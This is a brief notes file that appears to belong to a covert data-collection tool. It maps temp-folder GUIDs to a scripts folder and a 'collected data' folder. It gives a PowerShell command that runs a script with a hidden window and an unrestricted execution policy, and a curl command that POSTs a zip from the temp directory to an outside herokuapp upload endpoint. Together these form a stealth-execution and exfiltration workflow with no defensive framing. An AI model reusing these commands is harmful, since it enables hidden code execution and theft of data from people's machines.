ebcb78ac-7b55-45ca-beb2-947b3439e9ce = scripts folder       | temp/ebcb78ac-7b55-45ca-beb2-947b3439e9ce
f3a4def0-1632-4d84-a99b-7c69233a91b8 = Colleted data folder | temp/f3a4def0-1632-4d84-a99b-7c69233a91b8


powershell.exe -windowstyle hidden -executionpolicy unrestricted -file $env:temp\main.ps1

// upload scripts zip file
curl.exe --request POST --url https://gabup.herokuapp.com/upload --header 'Content-Type: multipart/form-data' --form file="@$env:temp\ebcb78ac-7b55-45ca-beb2-947b3439e9ce.zip"

